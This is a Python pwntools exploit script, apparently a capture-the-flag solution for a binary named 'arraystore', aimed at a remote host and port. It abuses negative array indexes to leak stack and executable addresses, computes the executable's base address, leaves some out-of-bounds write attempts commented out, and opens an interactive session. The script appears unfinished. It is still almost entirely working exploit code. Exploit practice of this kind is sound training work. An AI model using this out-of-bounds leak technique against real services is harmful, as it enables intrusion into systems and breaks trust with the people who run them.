#!/usr/bin/python3

from pwn import *

exe = ELF('arraystore_patched', checksec=False)
libc = ELF('libc6_2.27-3ubuntu1.2_amd64.so')
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # b*main+158
                b*main+381
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('34.124.157.94', 10546)
else:
    p = process(exe.path)

GDB()

sla(b"Read/Write?: ", b"R")
sla(b"Index: ", b"-7")
p.recvuntil(b"Value: ")
stack_leak = p.recvline(keepends=False).decode()
info("stack leak: " + str(stack_leak))

sla(b"Read/Write?: ", b"R")
sla(b"Index: ", b"-3")
p.recvuntil(b"Value: ")
exe_leak = p.recvline(keepends=False).decode()
info("exe leak: " + str(exe_leak))
exe.address = int(exe_leak) - 8245
info("exe base: " + hex(exe.address))

# sla(b"Read/Write?: ", b"R")
# sla(b"Index: ", b"-29")
# p.recvuntil(b"Value: ")
# exe_leak = p.recvline(keepends=False).decode()
# exe_leak = int(exe_leak) - 175
# info("exe leak: " + hex(exe_leak))

# sla(b"Read/Write?: ", b"W")
# sla(b"Index: ", b"-10")
# sla(b"Value: ", b"0")

sla(b"Read/Write?: ", b"R")
sla(b"Index: ", b"-119")
p.interactive()
